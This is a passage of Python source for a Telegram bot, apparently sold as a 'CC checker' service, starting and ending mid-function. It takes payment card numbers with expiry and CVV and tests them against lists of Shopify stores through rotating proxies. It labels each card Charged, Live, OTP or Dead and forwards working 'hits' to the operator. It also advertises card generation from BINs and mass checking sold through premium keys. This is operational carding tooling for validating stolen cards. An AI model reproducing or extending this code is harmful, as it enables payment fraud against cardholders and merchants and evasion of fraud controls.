        await status_msg.edit(premium_emoji("❌ Test Failed! Not Added."), parse_mode="html")

# ---- /site (Check Sites & Auto-Delete Dead) ----
@bot.on(events.NewMessage(pattern=r'^/site$'))
async def site_check_command(event):
    user_id = event.sender_id
    if is_admin(user_id):
        sites = load_sites()
        site_type = "Bot Sites (shopixsites.txt)"
    else:
        sites = get_user_sites_sync(user_id)
        site_type = "Your Personal Sites"

    if not sites:
        await event.reply(premium_emoji("❌ **No sites available to check!**\nUse `/uploadsites` (Admin) or `/addsite url` first."), parse_mode="html")
        return

    msg = await event.reply(premium_emoji(f"""<b>⚡ Site Checker Started</b>
👤 <b>Mode:</b> {site_type}
📊 <b>Total Sites:</b> <code>{len(sites)}</code>
🔍 <b>Checking & Removing Dead...</b>"""), parse_mode="html")

    alive, dead = await fast_site_check(sites)

    # Dead sites ko permanently delete kar ke sirf alive save karna
    if is_admin(user_id):
        async with aiofiles.open(SITES_FILE, 'w', encoding='utf-8') as f:
            for s in alive:
                await f.write(f"{s}\n")
    else:
        data = await load_user_sites()
        data[str(user_id)] = alive
        await save_user_sites(data)

    # Working sites ki file bhejna
    if alive:
        txt_file = f"working_sites_{user_id}.txt"
        async with aiofiles.open(txt_file, 'w', encoding='utf-8') as f:
            await f.write("\n".join(alive))
        await bot.send_message(user_id, premium_emoji(f"📄 <b>{len(alive)} Working Sites Saved!</b>"), file=txt_file, parse_mode="html")
        try:
            os.remove(txt_file)
        except Exception:
            pass

    await msg.edit(premium_emoji(f"""<b>✅ Site Check Complete!</b>
━━━━━━━━━━━━━━━━━━━━
📊 <b>Total Checked:</b> <code>{len(sites)}</code>
✅ <b>Alive (Kept):</b> <code>{len(alive)}</code>
🗑 <b>Dead (Deleted):</b> <code>{dead}</code>
━━━━━━━━━━━━━━━━━━━━
⚡ <i>List updated — Dead sites removed automatically!</i>"""), parse_mode="html")

# ---- /proxy (Check Proxies & Auto-Delete Dead) ----
@bot.on(events.NewMessage(pattern=r'^/proxy$'))
async def proxy_command(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly admin can check & clean global proxies."), parse_mode="html")
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ **No proxies in proxy.txt!**\nUse `/uploadproxy` or `/addproxy` first."), parse_mode="html")
        return

    total = len(proxies)
    status_msg = await event.reply(premium_emoji(f"""<b>⚡ Proxy Checker Started</b>
📊 <b>Total Proxies:</b> <code>{total}</code>
🔍 <b>Checking & Removing Dead...</b>"""), parse_mode="html")

    alive_proxies = []
    dead_proxies = []
    checked = 0
    batch_size = 15  # Ek saath 15 proxies check hongi (fast speed)

    for i in range(0, total, batch_size):
        batch = proxies[i:i + batch_size]
        results = await asyncio.gather(*[check_proxy(p) for p in batch], return_exceptions=True)

        for proxy, res in zip(batch, results):
            checked += 1
            if isinstance(res, dict) and res.get('alive'):
                alive_proxies.append(proxy)
            else:
                dead_proxies.append(proxy)

        try:
            await status_msg.edit(premium_emoji(f"""<b>🔄 Checking Proxies...</b>
━━━━━━━━━━━━━━━━━━━━
✅ <b>Alive:</b> <code>{len(alive_proxies)}</code>
❌ <b>Dead:</b> <code>{len(dead_proxies)}</code>
📊 <b>Progress:</b> <code>{checked}/{total}</code>"""), parse_mode="html")
        except Exception:
            pass

    # Dead proxies ko delete kar ke sirf alive proxies ko proxy.txt mein save karna
    async with aiofiles.open(PROXY_FILE, 'w', encoding='utf-8') as f:
        for p in alive_proxies:
            await f.write(f"{p}\n")

    # Working proxies ki file bhejna
    if alive_proxies:
        txt_file = f"working_proxies_{user_id}.txt"
        async with aiofiles.open(txt_file, 'w', encoding='utf-8') as f:
            await f.write("\n".join(alive_proxies))
        await bot.send_message(user_id, premium_emoji(f"📄 <b>{len(alive_proxies)} Working Proxies Saved!</b>"), file=txt_file, parse_mode="html")
        try:
            os.remove(txt_file)
        except Exception:
            pass

    await status_msg.edit(premium_emoji(f"""<b>✅ Proxy Check Complete!</b>
━━━━━━━━━━━━━━━━━━━━
📊 <b>Total Checked:</b> <code>{total}</code>
✅ <b>Alive (Kept):</b> <code>{len(alive_proxies)}</code>
🗑 <b>Dead (Deleted):</b> <code>{len(dead_proxies)}</code>
━━━━━━━━━━━━━━━━━━━━
⚡ <i>proxy.txt updated — Dead proxies deleted automatically!</i>"""), parse_mode="html")

# ---- /rm ----
@bot.on(events.NewMessage(pattern=r'^/rm\s+(.+)'))
async def remove_user_site_cmd(event):
    user_id = event.sender_id
    site_to_remove = event.pattern_match.group(1).strip()
    if not site_to_remove.startswith("http"):
        site_to_remove = f"https://{site_to_remove}"
    user_sites = get_user_sites_sync(user_id)
    if site_to_remove not in user_sites:
        await event.reply(premium_emoji("❌ Site not found in your list!"), parse_mode="html")
        return
    await remove_user_site(user_id, site_to_remove)
    remaining = len(get_user_sites_sync(user_id))
    await event.reply(premium_emoji(f"✅ Site Removed!\n🗑 <code>{site_to_remove[:50]}</code>\n📊 Remaining: <code>{remaining}</code>"), parse_mode="html")

# ---- /mysites ----
@bot.on(events.NewMessage(pattern=r'^/mysites$'))
async def my_sites_cmd(event):
    user_id = event.sender_id
    sites = get_user_sites_sync(user_id)
    if not sites:
        await event.reply(premium_emoji("❌ No sites added yet.\nUse /addsite url to add."), parse_mode="html")
        return
    site_list = "\n".join([f"• <code>{s}</code>" for s in sites])
    await event.reply(premium_emoji(f"""📋 **Your Sites ({len(sites)})**
━━━━━━━━━━━━━━━━━━━━
{site_list}"""), parse_mode="html")

# ---- /clearsites ----
@bot.on(events.NewMessage(pattern=r'^/clearsites$'))
async def clear_user_sites_cmd(event):
    user_id = event.sender_id
    user_sites = get_user_sites_sync(user_id)
    if not user_sites:
        await event.reply(premium_emoji("❌ No sites to clear!"), parse_mode="html")
        return
    count = len(user_sites)
    await clear_user_sites(user_id)
    await event.reply(premium_emoji(f"✅ Cleared {count} sites!"), parse_mode="html")

# ---- PROXY COMMANDS ----
@bot.on(events.NewMessage(pattern='/getproxy'))
async def get_proxies(event):
    user_id = event.sender_id
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies in your list."))
        return
    if len(proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies)])
        await event.reply(premium_emoji(f"📋 **Proxies ({len(proxies)}):**\n\n{proxy_list}"), parse_mode="html")
    else:
        timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        with open(filename, "w") as f:
            for proxy in proxies:
                f.write(f"{proxy}\n")
        await event.reply(premium_emoji(f"📋 **Proxies ({len(proxies)}):**"), file=filename)
        try:
            os.remove(filename)
        except Exception:
            pass

@bot.on(events.NewMessage(pattern=r'^/myproxies$'))
async def view_user_proxies(event):
    proxies = load_proxies()
    if not proxies:
        await event.reply("📭 **No proxies in your list.**\n\nUse `/uploadproxy` or `/addproxy` to add.")
        return
    proxy_list = "\n".join([f"{i+1}. `{p}`" for i, p in enumerate(proxies[:50])])
    await event.reply(f"📋 **Proxies ({len(proxies)}):**\n\n{proxy_list}")

@bot.on(events.NewMessage(pattern=r'^/addproxy(?:\s|\n|$)([\s\S]*)'))
async def add_user_proxy_cmd(event):
    user_id = event.sender_id
    proxy_input = (event.pattern_match.group(1) or "").strip()
    if not proxy_input:
        await event.reply(premium_emoji("📋 Usage: <code>/addproxy ip:port</code> or <code>/uploadproxy</code>"), parse_mode="html")
        return
    proxies_raw = []
    for line in proxy_input.splitlines():
        for p in line.split():
            p = p.strip()
            if p and ":" in p and p not in proxies_raw:
                proxies_raw.append(p)
    if not proxies_raw:
        await event.reply(premium_emoji("❌ No valid proxy found."))
        return
    added = 0
    for proxy in proxies_raw:
        res = await check_proxy(proxy)
        if isinstance(res, dict) and res.get('alive'):
            await add_user_proxy(user_id, proxy)
            with open(PROXY_FILE, "a", encoding="utf-8") as pf:
                pf.write(f"{proxy}\n")
            added += 1
    await event.reply(premium_emoji(f"✅ Checked {len(proxies_raw)} proxies, added <code>{added}</code> alive."), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/rmproxy\s+'))
async def remove_single_proxy(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly admins can use this command."))
        return
    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    current = load_proxies()
    if proxy_to_remove not in current:
        await event.reply(premium_emoji(f"❌ Proxy not found: `{proxy_to_remove}`"))
        return
    new_proxies = [p for p in current if p != proxy_to_remove]
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in new_proxies:
            await f.write(f"{p}\n")
    await event.reply(premium_emoji(f"✅ **Proxy Removed!**\n📊 Remaining: `{len(new_proxies)}`"), parse_mode="html")

@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clear_proxies(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("❌ Admin only."))
        return
    count = len(load_proxies())
    open(PROXY_FILE, "w").close()
    await event.reply(premium_emoji(f"✅ Cleared <code>{count}</code> proxies!"), parse_mode="html")

# ---- BLOCK/UNBLOCK ----
@bot.on(events.NewMessage(pattern=r'^/block\s+(\d+)'))
async def block_user_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("<b>❌ Only admin can use this command!</b>"), parse_mode="html")
        return
    target_id = int(event.pattern_match.group(1))
    if target_id == event.sender_id:
        await event.reply(premium_emoji("<b>❌ Cannot block yourself!</b>"), parse_mode="html")
        return
    block_user(target_id)
    await event.reply(premium_emoji(f"<b>🚫 User <code>{target_id}</code> blocked!</b>"), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/unblock\s+(\d+)'))
async def unblock_user_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("<b>❌ Only admin can use this command!</b>"), parse_mode="html")
        return
    target_id = int(event.pattern_match.group(1))
    unblock_user(target_id)
    await event.reply(premium_emoji(f"<b>✅ User <code>{target_id}</code> unblocked!</b>"), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/blocklist$'))
async def block_list_cmd(event):
    if not is_admin(event.sender_id):
        return
    blocked = get_blocked_users()
    if not blocked:
        await event.reply(premium_emoji("<b>📋 Blocked list is empty!</b>"), parse_mode="html")
        return
    await event.reply(premium_emoji("<b>🚫 Blocked Users:</b>\n" + "\n".join(f"<code>{u}</code>" for u in blocked)), parse_mode="html")

# ---- KEY GENERATION & REDEEM ----
@bot.on(events.NewMessage(pattern=r'^/key\s+(\d+)\s+(\d+)\s+(\d+)$'))
async def generate_key_cmd(event):
    if not is_admin(event.sender_id):
        await event.reply(premium_emoji("<b>❌ Only admin can use this command.</b>"), parse_mode="html")
        return
    count = int(event.pattern_match.group(1))
    days = int(event.pattern_match.group(2))
    device_limit = int(event.pattern_match.group(3))
    keys = [generate_multi_device_key(days, device_limit) for _ in range(count)]
    msg = f"<b>Keys Generated</b> ✅\n" + "\n".join(f"{i}. <code>{k}</code>" for i, k in enumerate(keys, 1))
    await event.reply(premium_emoji(msg), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/redeem\s+(.+)'))
async def redeem_cmd(event):
    user_id = event.sender_id
    key = event.pattern_match.group(1).strip().upper()
    result = redeem_multi_device_key(key, user_id)
    if result == "success":
        await event.reply(premium_emoji("<b>🎉 Premium activated successfully!</b>"), parse_mode="html")
    elif result == "already_premium":
        await event.reply(premium_emoji("<b>⚠️ Already premium!</b>"), parse_mode="html")
    elif result == "device_limit_reached":
        await event.reply(premium_emoji("<b>❌ Device limit reached!</b>"), parse_mode="html")
    elif result == "used":
        await event.reply(premium_emoji("<b>❌ Key already redeemed!</b>"), parse_mode="html")
    else:
        await event.reply(premium_emoji("<b>❌ Invalid or expired key!</b>"), parse_mode="html")

# ---- /plan ----
@bot.on(events.NewMessage(pattern='/plan'))
async def plan_cmd(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or "No Username"
        first_name = sender.first_name or "Unknown"
    except Exception:
        username = "Unknown"
        first_name = "Unknown"
    if is_admin(user_id):
        plan_type = "👑 Admin"
        daily_used, daily_limit = "∞", "∞"
    elif is_premium(user_id):
        plan_type = "💎 Premium"
        daily_used, daily_limit = "∞", "∞"
    else:
        plan_type = "⭐ Free"
        daily_used = str(get_daily_usage(user_id).get("cc_count", 0))
        daily_limit = "150"
    msg = f"""⚡💳 <b>{BOT_NAME.upper()}</b> 💳⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━
🆔 <b>ID:</b> <code>{user_id}</code>
👤 <b>Name:</b> {first_name} (@{username})
🏷️ <b>Plan:</b> {plan_type}
🔥 <b>Used Today:</b> <code>{daily_used}</code> / <code>{daily_limit}</code> CC
━━━━━━━━━━━━━━━━━━━━━━━━━━
🤖 <b>Bot:</b> {BOT_NAME}"""
    await event.reply(premium_emoji(msg), parse_mode='html')

# ---- /start (NO REQUIRED GROUP ON START) ----
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    if is_blocked(user_id):
        return
    save_user(user_id)
    try:
        sender = await event.get_sender()
        first_name = sender.first_name or "Unknown"
    except Exception:
        first_name = "Unknown"
    if is_admin(user_id):
        plan, plan_emoji = "👑 Admin", "👑"
    elif is_premium(user_id):
        plan, plan_emoji = "💎 Premium", "💎"
    else:
        plan, plan_emoji = "⭐ Free", "⭐"

    welcome_msg = f"""<b>⚡ {BOT_NAME} ⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>👑 User: <a href="tg://user?id={user_id}">{first_name}</a></b>
<b>✅ User ID: <code>{user_id}</code></b>
<b>{plan_emoji} Access: {plan}</b>
━━━━━━━━━━━━━━━━━━━━
<b>👇 Select an option below:</b>"""
    main_buttons = [
        [Button.inline("ᴄʜᴇᴄᴋᴇʀ", b"checker", style="danger"), Button.inline("ʙᴜʏ ɴᴏᴡ", b"buy", style="danger")],
        [Button.inline("ᴛᴏᴏʟs", b"tools_menu", style="danger"), Button.inline("sᴜᴘᴘᴏʀᴛ", b"support_menu", style="danger")],
    ]
    await bot.send_file(event.chat_id, file=PHOTO_URL, caption=premium_emoji(welcome_msg), buttons=main_buttons, parse_mode="html", force_document=False)

# ---- CALLBACK MENUS ----
@bot.on(events.CallbackQuery(pattern=b"checker"))
async def checker_menu(event):
    checker_buttons = [
        [Button.inline("sɪɴɢʟᴇ ᴄᴄ", b"charge", style="danger"), Button.inline("ᴍᴀss ᴄᴄ", b"mass", style="danger")],
        [Button.inline("🔙 ʙᴀᴄᴋ", b"back_to_start", style="success")]
    ]
    await event.edit(premium_emoji(f"<b>🔒 {BOT_NAME.upper()} MENU 🔒</b>\n\n<b>👇 Select check mode:</b>"), buttons=checker_buttons, parse_mode="html")

@bot.on(events.CallbackQuery(pattern=b"charge"))
async def charge_handler(event):
    charge_msg = f"""<b>⚡💳 SHOPIFY SINGLE CHECK ⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>💠 Gateway: Shopify</b>
<b>👇 Use command:</b>
<code>/cc 4097580790933573|06|2030|208</code>"""
    await event.edit(premium_emoji(charge_msg), buttons=[[Button.inline("🔙 ʙᴀᴄᴋ", b"checker", style="success")]], parse_mode="html")

@bot.on(events.CallbackQuery(pattern=b"mass"))
async def mass_handler(event):
    mass_msg = f"""<b>⚡ SHOPIFY MASS CHECK ⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>🔥 Shopify Bulk:</b>
<code>/chk</code> <b>(Reply to .txt file)</b>"""
    await event.edit(premium_emoji(mass_msg), buttons=[[Button.inline("🔙 ʙᴀᴄᴋ", b"checker", style="success")]], parse_mode="html")

@bot.on(events.CallbackQuery(pattern=b"buy"))
async def buy_handler(event):
    plan_msg = f"""<b>💎 PREMIUM PLANS 💎</b>
━━━━━━━━━━━━━━━━━━━━
<b>👑 Owner ID:</b> <code>{ADMIN_ID}</code>"""
    await event.edit(premium_emoji(plan_msg), buttons=[[Button.inline("🔙 ʙᴀᴄᴋ", b"back_to_start", style="success")]], parse_mode="html")

@bot.on(events.CallbackQuery(pattern=b"support_menu"))
async def support_menu(event):
    user_id = event.sender_id
    support_msg = f"""<b>🆘 SUPPORT MENU 🆘</b>
━━━━━━━━━━━━━━━━━━━━
<b>🆔 User ID:</b> <code>{user_id}</code>
<b>👑 Owner ID:</b> <code>{ADMIN_ID}</code>
<b>🤖 Bot:</b> {BOT_NAME}"""
    await event.edit(premium_emoji(support_msg), buttons=[[Button.inline("🔙 ʙᴀᴄᴋ", b"back_to_start", style="success")]], parse_mode="html")

@bot.on(events.CallbackQuery(pattern=b"tools_menu"))
async def tools_menu(event):
    tools_buttons = [
        [Button.inline("sʜᴏᴘɪꜰʏ", b"shopify_tools", style="danger"), Button.inline("ᴘʀᴏxʏ", b"proxy_tools", style="danger")],
        [Button.inline("ᴄᴄ ᴍᴇɴᴜ", b"cc_tools", style="danger"), Button.inline("ᴀᴅᴍɪɴ", b"admin_tools", style="danger")],
        [Button.inline("🔙 ʙᴀᴄᴋ", b"back_to_start", style="success")],
    ]
    await event.edit(premium_emoji(f"<b>🔧 {BOT_NAME.upper()} TOOLS 🔧</b>"), buttons=tools_buttons, parse_mode="html")

@bot.on(events.CallbackQuery(pattern=b"shopify_tools"))
async def shopify_tools_menu(event):
    msg = """<b>🛒 SHOPIFY TOOLS</b>
━━━━━━━━━━━━━━━━━━━━
<code>/site</code> - Check sites
<code>/addsite url</code> - Test & add site
<code>/uploadsites</code> - Replace sites from .txt reply
<code>/rm url</code> - Remove site
<code>/mysites</code> - List your sites"""
    await event.edit(premium_emoji(msg), buttons=[[Button.inline("🔙 ʙᴀᴄᴋ", b"tools_menu", style="success")]], parse_mode="html")

@bot.on(events.CallbackQuery(pattern=b"proxy_tools"))
async def proxy_tools_menu(event):
    msg = """<b>📡 PROXY TOOLS</b>
━━━━━━━━━━━━━━━━━━━━
<code>/uploadproxy</code> - Replace proxies from .txt reply or text
<code>/addproxy ip:port</code> - Test & add proxy
<code>/getproxy</code> - View/export proxies
<code>/rmproxy ip:port</code> - Remove proxy
<code>/clearproxy</code> - Clear all proxies"""
    await event.edit(premium_emoji(msg), buttons=[[Button.inline("🔙 ʙᴀᴄᴋ", b"tools_menu", style="success")]], parse_mode="html")

@bot.on(events.CallbackQuery(pattern=b"cc_tools"))
async def cc_tools_menu(event):
    msg = """<b>💳 CC TOOLS</b>
━━━━━━━━━━━━━━━━━━━━
<code>/gen BIN COUNT</code> - Generate cards
<code>/scrape</code> - Clean & deduplicate .txt cards
<code>/split N</code> - Split .txt cards into chunks"""
    await event.edit(premium_emoji(msg), buttons=[[Button.inline("🔙 ʙᴀᴄᴋ", b"tools_menu", style="success")]], parse_mode="html")

@bot.on(events.CallbackQuery(pattern=b"admin_tools"))
async def admin_tools_menu(event):
    msg = """<b>👑 ADMIN & LOGS COMMANDS</b>
━━━━━━━━━━━━━━━━━━━━
<code>/setlogs &lt;channel_id&gt;</code> - Set log channel (reply GIF/video optional)
<code>/addgroup &lt;id_or_link&gt;</code> - Set required group
<code>/stats</code> - View bot stats
<code>/testapis</code> - Test Shopify APIs"""
    await event.edit(premium_emoji(msg), buttons=[[Button.inline("🔙 ʙᴀᴄᴋ", b"tools_menu", style="success")]], parse_mode="html")

@bot.on(events.CallbackQuery(pattern=b"back_to_start"))
async def back_to_start(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        first_name = sender.first_name or "Unknown"
    except Exception:
        first_name = "Unknown"
    plan, plan_emoji = ("👑 Admin", "👑") if is_admin(user_id) else (("💎 Premium", "💎") if is_premium(user_id) else ("⭐ Free", "⭐"))
    welcome_msg = f"""<b>⚡ {BOT_NAME} ⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>👑 User: <a href="tg://user?id={user_id}">{first_name}</a></b>
<b>✅ User ID: <code>{user_id}</code></b>
<b>{plan_emoji} Access: {plan}</b>
━━━━━━━━━━━━━━━━━━━━
<b>👇 Select an option below:</b>"""
    main_buttons = [
        [Button.inline("ᴄʜᴇᴄᴋᴇʀ", b"checker", style="danger"), Button.inline("ʙᴜʏ ɴᴏᴡ", b"buy", style="danger")],
        [Button.inline("ᴛᴏᴏʟs", b"tools_menu", style="danger"), Button.inline("sᴜᴘᴘᴏʀᴛ", b"support_menu", style="danger")],
    ]
    await event.edit(premium_emoji(welcome_msg), buttons=main_buttons, parse_mode="html")

# ---- BUTTONS FOR CHARGED / LIVE / DEAD / REFRESH / STOP ----
async def send_card_file(user_id, cards, title, file_prefix):
    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    filename = f"{file_prefix}_Cards_{user_id}_{timestamp}.txt"
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        for r in cards:
            await f.write(f"{r.get('card', 'N/A')} | {r.get('gateway', 'Shopify')} | {r.get('price', '-')} | {str(r.get('message', 'Unknown'))[:120]}\n")
    try:
        await bot.send_file(user_id, file=filename, caption=f"[❆] {title} – {len(cards)} cards", parse_mode="html")
    except Exception as e:
        await bot.send_message(user_id, f"❌ Error sending file: {str(e)[:100]}")
    try:
        os.remove(filename)
    except Exception:
        pass

@bot.on(events.CallbackQuery(pattern=b"charged_"))
async def charged_button_handler(event):
    user_id = event.sender_id
    now = time.time()
    if user_id in last_click and (now - last_click[user_id]) < 15:
        await event.answer(f"⏳ Wait {int(15 - (now - last_click[user_id]))}s", alert=True)
        return
    last_click[user_id] = now
    msg_id = int(event.data.decode().split("_")[1])
    results = active_sessions.get(f"{user_id}_{msg_id}", {}).get('results', {})
    cards = results.get('charged', [])
    if not cards:
        await event.answer("❌ No charged cards yet!", alert=True)
        return
    await send_card_file(user_id, cards, "CHARGED 💎", "charged")
    await event.answer(f"✅ {len(cards)} charged cards sent!", alert=True)

@bot.on(events.CallbackQuery(pattern=b"live_"))
async def live_button_handler(event):
    user_id = event.sender_id
    now = time.time()
    if user_id in last_click and (now - last_click[user_id]) < 15:
        await event.answer(f"⏳ Wait {int(15 - (now - last_click[user_id]))}s", alert=True)
        return
    last_click[user_id] = now
    msg_id = int(event.data.decode().split("_")[1])
    results = active_sessions.get(f"{user_id}_{msg_id}", {}).get('results', {})
    cards = results.get('approved', [])
    if not cards:
        await event.answer("❌ No live cards yet!", alert=True)
        return
    await send_card_file(user_id, cards, "LIVE 🔥", "live")
    await event.answer(f"✅ {len(cards)} live cards sent!", alert=True)

@bot.on(events.CallbackQuery(pattern=b"refresh_"))
async def refresh_button_handler(event):
    user_id = event.sender_id
    msg_id = int(event.data.decode().split("_")[1])
    session_key = f"{user_id}_{msg_id}"
    if session_key not in active_sessions:
        await event.answer("❌ No active session!", alert=True)
        return
    results = active_sessions[session_key].get('results', {})
    checked = results.get('checked', 0)
    await update_progress(user_id, msg_id, results, checked, "User")
    await event.answer("🔄 Refreshed!", alert=False)

@bot.on(events.CallbackQuery(pattern=b"stop_"))
async def stop_handler(event):
    user_id = event.sender_id
    msg_id = int(event.data.decode().split("_")[1])
    session_key = f"{user_id}_{msg_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await asyncio.sleep(1.0)
        results = active_sessions[session_key].get('results', {})
        await send_final_results(user_id, results)
        del active_sessions[session_key]
        await event.answer("🛑 Stopped!", alert=True)
        try:
            await event.edit(premium_emoji("🛑 **Stopped!**"))
        except Exception:
            pass
    else:
        await event.answer("No active session found!", alert=True)

# ---- SINGLE CC CHECK ----
@bot.on(events.NewMessage(pattern=r'^/cc(?:\s|$)'))
async def single_cc_check(event):
    user_id = event.sender_id
    if is_blocked(user_id):
        return
    save_user(user_id)
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("<b>❌ NO PROXY IN proxy.txt!</b> Use <code>/uploadproxy</code> or <code>/addproxy</code>."), parse_mode="html")
        return
    allowed, _ = check_limits(user_id, False)
    if not allowed:
        await event.reply(premium_emoji("❌ Daily limit khatam. Premium le lo."))
        return
    parts = (event.message.text or "").split(' ', 1)
    if len(parts) < 2 or not parts[1].strip():
        await event.reply("Usage: `/cc 5209430225796165|01|27|458`")
        return
    cards = extract_cc(parts[1].strip())
    if not cards:
        await event.reply(premium_emoji("❌ Invalid CC format. Use: card|mm|yyyy|cvv"))
        return
    try:
        sender = await event.get_sender()
        first_name = sender.first_name or "User"
    except Exception:
        first_name = "User"
    user_sites = get_user_sites_sync(user_id)
    global_sites = load_sites()
    sites = user_sites if user_sites else global_sites
    if not sites:
        await event.reply(premium_emoji("❌ **No sites available!**"), parse_mode="html")
        return
    card = cards[0]
    status_msg = await event.reply(premium_emoji("<b>⚡ Checking Shopify...</b>"), parse_mode='html')
    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=10)
        await update_daily_usage(user_id, 1)
        brand, _, _, bank, country, flag = await get_bin_info(card.split('|')[0])
        gateway = result.get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = result.get("price", "-")
        response_msg = str(result.get('message', 'Unknown Response'))[:120]

        if result['status'] == 'Charged':
            status_text = "Charged 💎"
        elif result['status'] == 'Approved':
            status_text = "Live 🔥"
        elif result['status'] == 'OTP':
            status_text = "OTP Required 🔑"
        else:
            status_text = "Dead ❌"

        current_time = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%I:%M:%S %p IST")
        final_resp = f"""[❆] {status_text}
💳
   ⤷ <code>{result['card']}</code>
Gate ➳ {gateway} {price}
──────────
Resp ➳ {response_msg}
Bin ➳ <code>{brand} - {bank} - {country} {flag}</code>
──────────
⏱ ➳ {current_time}
🔗 ➳ <a href="tg://user?id={user_id}">{first_name}</a>
🤩 ➳ <b>{BOT_NAME}</b>"""

        try:
            await status_msg.delete()
        except Exception:
            pass

        if result['status'] in ('Charged', 'Approved'):
            await send_hit_to_admin(result, user_id, result['status'])
            await send_realtime_hit_dm(user_id, result, result['status'], first_name)
        else:
            await event.reply(premium_emoji(final_resp), parse_mode="html", buttons=kb_bot_link())
        if result['status'] == 'Charged':
            await auto_pin_charged(user_id, result)
    except Exception as e:
        try:
            await status_msg.edit(premium_emoji(f"❌ Error: {str(e)[:80]}"), parse_mode='html')
        except Exception:
            await event.reply(premium_emoji(f"❌ Error: {str(e)[:80]}"), parse_mode='html')

# ---- /chk (Mass Check with live last CC & response) ----
@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    user_id = event.sender_id
    if is_blocked(user_id):
        return
    save_user(user_id)
    if user_id in user_check_locks:
        await event.reply(premium_emoji("<b>⚠️ ALREADY CHECKING!</b> Use <code>/stop</code> or wait."), parse_mode="html")
        return
    is_admin_user = is_admin(user_id)
    is_prem_user = is_premium(user_id)
    if not is_admin_user and not is_prem_user:
        await event.reply(premium_emoji("<b>🔒 PREMIUM ONLY</b>\nUse <code>/redeem KEY</code>."), parse_mode="html")
        return
    try:
        sender = await event.get_sender()
        username = sender.username or sender.first_name or f"user_{user_id}"
    except Exception:
        username = f"user_{user_id}"
    if not event.reply_to_msg_id:
        await event.reply("❌ Reply to .txt file.")
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg or not reply_msg.file or not str(reply_msg.file.name).endswith('.txt'):
        await event.reply("❌ Sirf .txt file reply kar.")
        return
    user_sites = get_user_sites_sync(user_id)
    global_sites = load_sites()
    proxies = load_proxies()
    if not proxies:
        await event.reply("❌ No proxies available! Use /uploadproxy or /addproxy first.")
        return
    if not user_sites and not global_sites:
        await event.reply("❌ No sites available!")
        return

    status_msg = await event.reply("🔄 Loading...")
    await status_msg.edit(
        """<b>🔄 Select Sites Source</b>
🟢 <b>Your Sites</b>
🔵 <b>Bot Sites</b>
<b>👇 Choose which sites to use:</b>""",
        buttons=[
            [Button.inline("🟢 MY SITES", f"chk_my_{status_msg.id}".encode(), style="primary"),
             Button.inline("🔵 BOT SITES", f"chk_global_{status_msg.id}".encode(), style="primary")],
            [Button.inline("❌ CANCEL", f"cancel_chk_{status_msg.id}".encode(), style="danger")]
        ],
        parse_mode="html"
    )
    active_sessions[f"chk_{user_id}_{status_msg.id}"] = {
        'user_id': user_id, 'username': username,
        'is_admin': is_admin_user, 'is_premium': is_prem_user,
        'reply_msg': reply_msg, 'status_msg_id': status_msg.id,
        'user_sites': user_sites, 'global_sites': global_sites, 'proxies': proxies
    }

@bot.on(events.CallbackQuery(pattern=rb"chk_my_(\d+)"))
async def chk_my_sites_handler(event):
    user_id = event.sender_id
    msg_id = int(event.pattern_match.group(1).decode())
    session_key = f"chk_{user_id}_{msg_id}"
    if session_key not in active_sessions:
        await event.answer("❌ Session expired! Use /chk again.", alert=True)
        return
    data = active_sessions[session_key]
    sites = data['user_sites']
    if not sites:
        await event.answer("❌ Aapne koi site add nahi ki!", alert=True)
        return
    await event.answer(f"✅ Using YOUR {len(sites)} sites!", alert=True)
    try:
        await event.delete()
    except Exception:
        pass
    asyncio.create_task(run_chk(data, sites))

@bot.on(events.CallbackQuery(pattern=rb"chk_global_(\d+)"))
async def chk_global_sites_handler(event):
    user_id = event.sender_id
    msg_id = int(event.pattern_match.group(1).decode())
    session_key = f"chk_{user_id}_{msg_id}"
    if session_key not in active_sessions:
        await event.answer("❌ Session expired! Use /chk again.", alert=True)
        return
    data = active_sessions[session_key]
    sites = data['global_sites']
    if not sites:
        await event.answer("❌ Bot sites bhi nahi hain!", alert=True)
        return
    await event.answer(f"✅ Using BOT {len(sites)} sites!", alert=True)
    try:
        await event.delete()
    except Exception:
        pass
    asyncio.create_task(run_chk(data, sites))

@bot.on(events.CallbackQuery(pattern=rb"cancel_chk_(\d+)"))
async def cancel_chk_handler(event):
    msg_id = int(event.pattern_match.group(1).decode())
    await event.answer("❌ Cancelled!", alert=True)
    try:
        await event.delete()
